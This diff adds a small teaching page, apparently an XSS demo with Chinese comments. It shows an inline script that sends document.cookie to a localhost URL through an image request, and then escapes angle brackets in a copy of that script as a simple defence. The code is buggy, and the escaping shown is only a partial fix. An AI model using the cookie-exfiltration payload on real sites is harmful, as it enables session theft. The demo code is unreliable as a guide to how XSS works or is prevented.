@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>XSS</title>
+  </head>
+  <body>   
+    <h3>XSS Demo</h3>
+    <div id="container">
+      <p>Hello</p>
+      <script>
+        console.log('XSS 攻击咯')
+        console.log(document.cookie)
+
+        const img = document.createElement('image')
+        // 不跨域
+        img.src = 'https://localhost:3000/XXXX?cookie=' + document.cookie
+      </script>
+    </div>
+    <script>
+      // 防御手段，将敏感字符替换掉
+      const str = `
+        <script>
+          console.log('XSS 攻击咯')
+          console.log(document.cookie)
+
+          const img = document.createElement('image')
+          // 不跨域
+          img.src = 'https://localhost:3000/XXXX?cookie=' + document.cookie
+        </script>
+      `
+      const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
+    </script>
+  </body>
+</html>
